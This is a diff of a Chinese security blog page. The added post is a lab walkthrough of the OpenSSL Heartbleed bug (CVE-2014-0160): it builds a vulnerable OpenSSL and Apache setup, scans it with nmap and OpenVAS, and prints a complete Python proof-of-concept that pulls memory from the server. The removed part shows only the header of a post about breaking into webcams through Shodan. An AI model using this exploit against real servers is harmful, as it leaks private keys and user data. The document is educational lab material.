@@ -258,6 +258,226 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/27/openssl心脏出血漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/01/27/openssl心脏出血漏洞/" itemprop="url">
+                  openssl心脏出血漏洞
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-27T15:30:39+08:00">
+                2018-01-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/01/27/openssl心脏出血漏洞/" class="leancloud_visitors" data-flag-title="openssl心脏出血漏洞">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-heartbleed漏洞"><a href="#0x00-heartbleed漏洞" class="headerlink" title="0x00 heartbleed漏洞"></a>0x00 heartbleed漏洞</h2><p>Heartbleed漏洞，这项严重缺陷(CVE-2014-0160)的产生是由于未能在memcpy()调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪OpenSSL所分配的64KB缓存、将超出必要范围的字节信息复制到缓存当中再返回缓存内容，这样一来受害者的内存内容就会以每次64KB的速度进行泄露。  </p>
+<h2 id="0x02-基本背景和影响"><a href="#0x02-基本背景和影响" class="headerlink" title="0x02 基本背景和影响"></a>0x02 基本背景和影响</h2><p>OpenSSL心脏出血漏洞的大概原理是OpenSSL在2年前引入了心跳(heartbeat)机制来维持TLS链接的长期存在，心跳机制是作为TLS的扩展实现，但在代码中包括TLS(TCP)和DTLS(UDP)都没有做边界的检测，所以导致攻击者可以利用这个漏洞来获得TLS链接对端（可以是服务器，也可以是客户端）内存中的一些数据，至少可以获得16KB每次，理论上讲最大可以获取64KB。  </p>
+<p>OpenSSL是为网络通信提供安全及数据完整性的一种安全协议，囊括了主要的密码算法、常用的密钥和证书封装管理功能以及SSL协议．多数SSL加密网站是用名为OpenSSL的开源软件包，由于这也是互联网应用最广泛的安全传输方法，被网银、在线支付、电商网站、门户网站、电子邮件等重要网站广泛使用，所以漏洞影响范围广大。  </p>
+<h2 id="0x03-openssl编译安装"><a href="#0x03-openssl编译安装" class="headerlink" title="0x03 openssl编译安装"></a>0x03 openssl编译安装</h2><p>1、安装配置openssl并解决本机自带openssl<br>因为要替换本机版本，所以我们要用到编译安装<br>首先下载最后受漏洞影响的1.0.1f版本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.openssl.org/source/old/1.0.1/openssl-1.0.1f.tar.gz</span><br></pre></td></tr></table></figure></p>
+<p>先执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f /usr/bin/pod2man</span><br></pre></td></tr></table></figure></p>
+<p>防止编译安装openssl报错：POD document had syntax errors at /usr/bin/pod2man line 69. make: *** [install_docs]  </p>
+<p>然后解压下载的openssl后，在解压后的目录输入下面命令编译安装到/usr/local/openssl目录  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./config shared zlib  --prefix=/usr/local/openssl &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
+<p>等待编译完成，依次执行以下命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./config -t</span><br><span class="line">make depend</span><br><span class="line">cd /usr/local</span><br><span class="line">ln -s openssl ssl</span><br></pre></td></tr></table></figure></p>
+<p>在/etc/ld.so.conf文件的最后面，添加如下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/openssl/lib</span><br><span class="line">ldconfig</span><br></pre></td></tr></table></figure></p>
+<p>添加OPENSSL的环境变量：<br>在etc/profile的最后一行，添加：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export OPENSSL=/usr/local/openssl/bin</span><br><span class="line">export PATH=$OPENSSL:$PATH:$HOME/bin</span><br></pre></td></tr></table></figure>
+<p>退出命令界面，再从新登录。  </p>
+<p>依次执行下列名令，移除原版本的openssl，创建新的软连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mv /usr/bin/openssl /usr/bin/openssl.old</span><br><span class="line">mv /usr/include/openssl /usr/include/openssl.old</span><br><span class="line">ln -s /usr/local/openssl/bin/openssl /usr/bin/openssl</span><br><span class="line">ln -s /usr/local/openssl/include/openssl /usr/include/openssl</span><br><span class="line">ln -sf /usr/local/openssl/lib/libcrypto.so.1.0.0 /lib/libcrypto.so.6</span><br><span class="line">echo &quot;/usr/local/openssl/lib&quot; &gt;&gt;/etc/ld.so.conf </span><br><span class="line">ldconfig -v</span><br></pre></td></tr></table></figure></p>
+<p>执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd /usr/local/openssl/bin/openssl</span><br></pre></td></tr></table></figure></p>
+<p>会出现类似如下信息：<br><img src="http://oo3iot5oz.bkt.clouddn.com/heardbleed/heartbleed01.png" alt=""><br>测试新版本的OpenSSL是否正常工作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl</span><br><span class="line">OpenSSL&gt; version -a</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/heardbleed/heartbleed02.png" alt="">  </p>
+<p>此时，openssl安装完毕。  </p>
+<h2 id="0x04-apache编译安装"><a href="#0x04-apache编译安装" class="headerlink" title="0x04 apache编译安装"></a>0x04 apache编译安装</h2><p>如果用之前yum安装的apache，用nmap扫描heartbleed漏洞仍然会是没有漏洞的版本，所以我们要重新编译安装apache并链接到我们的openssl1.0.1f版本。  </p>
+<p>方法如下：  </p>
+<p>下载apache源码进行编译安装，并且要安装依赖arp 和arp-util :<br>下载过程不再赘述<br>arp安装:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr/local/apr</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p>
+<p>arp-util安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr/local/apr/util --with-apr=/usr/local/apr</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p>
+<p>apache安装，并配置到arp和arp-util和1.0.1f的openssl版本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr/local/httpd --enable-so --enable-rewrite --enable-ssl --with-ssl=/usr/local/openssl --with-apr=/usr/local/apr --with-apr-util=/usr/local/apr/util</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p>
+<p>此时apache重装完毕。  </p>
+<h2 id="0x05-apache和openssl配置"><a href="#0x05-apache和openssl配置" class="headerlink" title="0x05 apache和openssl配置"></a>0x05 apache和openssl配置</h2><p>首先安装依赖包：mod_ssl<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install mod_ssl</span><br></pre></td></tr></table></figure></p>
+<p>在安装目录下的httpd.conf中添加ssl支持（注意这里是刚安装的apache目录，不要去配置原来的apache）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModule ssl_module    modules/mod_ssl.so</span><br></pre></td></tr></table></figure></p>
+<p>并启动重定向（同样在httpd.conf）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RewriteEngine on</span><br><span class="line">RewriteCond %&#123;SERVER_PORT&#125; !^443$</span><br><span class="line">RewriteRule ^/?(.*)$ https://%&#123;SERVER_NAME&#125;/$1 [L,R]</span><br></pre></td></tr></table></figure></p>
+<p>利用openssl生成证书并修改Apache配置，实现https访问  </p>
+<p>（1）生成私钥(key文件):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -des3 -out server.key 1024</span><br></pre></td></tr></table></figure></p>
+<p>去除key文件口令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -in server.key -out server.key</span><br></pre></td></tr></table></figure></p>
+<p>（2）生成Certificate Signing Request（CSR）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -key server.key -out server.csr</span><br></pre></td></tr></table></figure></p>
+<p>依照其指示一步一步输入要求的个人信息即可<br>（3）建立服务器密钥请求文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -x509 -keyout server.key -out server.crt</span><br></pre></td></tr></table></figure></p>
+<p>（4）建立服务器证书<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl server.crt -req -signkey server.key -days 365</span><br></pre></td></tr></table></figure></p>
+<p>（5）将刚才生成的几个文件放在任意文件夹，然后vi编辑ssl.conf：</p>
+<p>将SSLCertificateFile和SSLCertificateKeyFile设置对应到这个路径的相应文件：  </p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/heardbleed/heartbleed03.png" alt="">  </p>
+<p>（6）重启apache，然后通过宿主机访问虚拟机ip，发现被自动定向到443端口:<br><img src="http://oo3iot5oz.bkt.clouddn.com/heardbleed/heartbleed04.png" alt="">  </p>
+<p>ps：<br>apache启动方法：<br>在apache安装路径/usr/local/httpd/bin  中输入./apachectl start启动apache</p>
+<p>此时，环境搭建完毕。  </p>
+<h2 id="0x06-使用poc攻击"><a href="#0x06-使用poc攻击" class="headerlink" title="0x06 使用poc攻击"></a>0x06 使用poc攻击</h2><p>用nmap -sV localhost –script=ssl-heartbleed测试漏洞环境  </p>
+<p>结果如下，发现心脏出血漏洞：</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/heardbleed/heartbleed05.png" alt="">  </p>
+<p>然后利用poc进行攻击<br>网上查到的python版poc：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line">执行命令如： python heartbleed.py <span class="number">192.168</span><span class="number">.152</span><span class="number">.132</span> -p <span class="number">443</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> select</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"></span><br><span class="line">options = OptionParser(usage=<span class="string">'%prog server [options]'</span>, description=<span class="string">'Test for SSL heartbeat vulnerability (CVE-2014-0160)'</span>)</span><br><span class="line">options.add_option(<span class="string">'-p'</span>, <span class="string">'--port'</span>, type=<span class="string">'int'</span>, default=<span class="number">443</span>, help=<span class="string">'TCP port to test (default: 443)'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">h2bin</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x.replace(<span class="string">' '</span>, <span class="string">''</span>).replace(<span class="string">'\n'</span>, <span class="string">''</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">hello = h2bin(<span class="string">'''</span></span><br><span class="line"><span class="string">16 03 02 00  dc 01 00 00 d8 03 02 53</span></span><br><span class="line"><span class="string">43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf</span></span><br><span class="line"><span class="string">bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00</span></span><br><span class="line"><span class="string">00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88</span></span><br><span class="line"><span class="string">00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c</span></span><br><span class="line"><span class="string">c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09</span></span><br><span class="line"><span class="string">c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44</span></span><br><span class="line"><span class="string">c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c</span></span><br><span class="line"><span class="string">c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11</span></span><br><span class="line"><span class="string">00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04</span></span><br><span class="line"><span class="string">03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19</span></span><br><span class="line"><span class="string">00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08</span></span><br><span class="line"><span class="string">00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13</span></span><br><span class="line"><span class="string">00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00</span></span><br><span class="line"><span class="string">00 0f 00 01 01                                  </span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line">hb = h2bin(<span class="string">''' </span></span><br><span class="line"><span class="string">18 03 02 00 03</span></span><br><span class="line"><span class="string">01 40 00</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexdump</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> xrange(<span class="number">0</span>, len(s), <span class="number">16</span>):</span><br><span class="line">        lin = [c <span class="keyword">for</span> c <span class="keyword">in</span> s[b : b + <span class="number">16</span>]]</span><br><span class="line">        hxdat = <span class="string">' '</span>.join(<span class="string">'%02X'</span> % ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> lin)</span><br><span class="line">        pdat = <span class="string">''</span>.join((c <span class="keyword">if</span> <span class="number">32</span> &lt;= ord(c) &lt;= <span class="number">126</span> <span class="keyword">else</span> <span class="string">'.'</span> )<span class="keyword">for</span> c <span class="keyword">in</span> lin)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'  %04x: %-48s %s'</span> % (b, hxdat, pdat)</span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvall</span><span class="params">(s, length, timeout=<span class="number">5</span>)</span>:</span></span><br><span class="line">    endtime = time.time() + timeout</span><br><span class="line">    rdata = <span class="string">''</span></span><br><span class="line">    remain = length</span><br><span class="line">    <span class="keyword">while</span> remain &gt; <span class="number">0</span>:</span><br><span class="line">        rtime = endtime - time.time() </span><br><span class="line">        <span class="keyword">if</span> rtime &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">        r, w, e = select.select([s], [], [], <span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> s <span class="keyword">in</span> r:</span><br><span class="line">            data = s.recv(remain)</span><br><span class="line">            <span class="comment"># EOF?</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">            rdata += data</span><br><span class="line">            remain -= len(data)</span><br><span class="line">    <span class="keyword">return</span> rdata</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvmsg</span><span class="params">(s)</span>:</span></span><br><span class="line">    hdr = recvall(s, <span class="number">5</span>)</span><br><span class="line">    <span class="keyword">if</span> hdr <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Unexpected EOF receiving record header - server closed connection'</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span></span><br><span class="line">    typ, ver, ln = struct.unpack(<span class="string">'&gt;BHH'</span>, hdr)</span><br><span class="line">    pay = recvall(s, ln, <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> pay <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Unexpected EOF receiving record payload - server closed connection'</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">' ... received message: type = %d, ver = %04x, length = %d'</span> % (typ, ver, len(pay))</span><br><span class="line">    <span class="keyword">return</span> typ, ver, pay</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hit_hb</span><span class="params">(s)</span>:</span></span><br><span class="line">    s.send(hb)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        typ, ver, pay = recvmsg(s)</span><br><span class="line">        <span class="keyword">if</span> typ <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'No heartbeat response received, server likely not vulnerable'</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> typ == <span class="number">24</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Received heartbeat response:'</span></span><br><span class="line">            hexdump(pay)</span><br><span class="line">            <span class="keyword">if</span> len(pay) &gt; <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'WARNING: server returned more data than it should - server is vulnerable!'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'Server processed malformed heartbeat, but did not return any extra data.'</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> typ == <span class="number">21</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Received alert:'</span></span><br><span class="line">            hexdump(pay)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Server returned error, likely not vulnerable'</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    opts, args = options.parse_args()</span><br><span class="line">    <span class="keyword">if</span> len(args) &lt; <span class="number">1</span>:</span><br><span class="line">        options.print_help()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Connecting...'</span></span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    s.connect((args[<span class="number">0</span>], opts.port))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Sending Client Hello...'</span></span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    s.send(hello)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Waiting for Server Hello...'</span></span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        typ, ver, pay = recvmsg(s)</span><br><span class="line">        <span class="keyword">if</span> typ == <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Server closed connection without sending Server Hello.'</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="comment"># Look for server hello done message.</span></span><br><span class="line">        <span class="keyword">if</span> typ == <span class="number">22</span> <span class="keyword">and</span> ord(pay[<span class="number">0</span>]) == <span class="number">0x0E</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Sending heartbeat request...'</span></span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    s.send(hb)</span><br><span class="line">    hit_hb(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
+<p>进行攻击，成功获得内存的数据  </p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/heardbleed/heartbleed06.png" alt="">  </p>
+<p>通过wireshark抓包，我们发现Heartbeat Response回复了大约16kb的内存数据。  </p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/heardbleed/heartbleed07.png" alt=""></p>
+<h2 id="0x07-使用openvas对该存在漏洞的系统扫描"><a href="#0x07-使用openvas对该存在漏洞的系统扫描" class="headerlink" title="0x07 使用openvas对该存在漏洞的系统扫描"></a>0x07 使用openvas对该存在漏洞的系统扫描</h2><p>结果如下：<br><img src="http://oo3iot5oz.bkt.clouddn.com/heardbleed/heartbleed08.png" alt=""><br><img src="http://oo3iot5oz.bkt.clouddn.com/heardbleed/heartbleed09.png" alt="">  </p>
+<h2 id="0x08-应对方案"><a href="#0x08-应对方案" class="headerlink" title="0x08 应对方案"></a>0x08 应对方案</h2><p>升级openssl版本</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/22/struts2-052漏洞/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2163,192 +2383,6 @@ main()
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/10/29/搜索引擎黑客之通过shodan入侵弱口令网络摄像头/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/10/29/搜索引擎黑客之通过shodan入侵弱口令网络摄像头/" itemprop="url">
-                  搜索引擎黑客之通过shodan入侵弱口令网络摄像头
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-29T19:57:30+08:00">
-                2017-10-29
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/网络安全/" itemprop="url" rel="index">
-                    <span itemprop="name">网络安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2017/10/29/搜索引擎黑客之通过shodan入侵弱口令网络摄像头/" class="leancloud_visitors" data-flag-title="搜索引擎黑客之通过shodan入侵弱口令网络摄像头">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
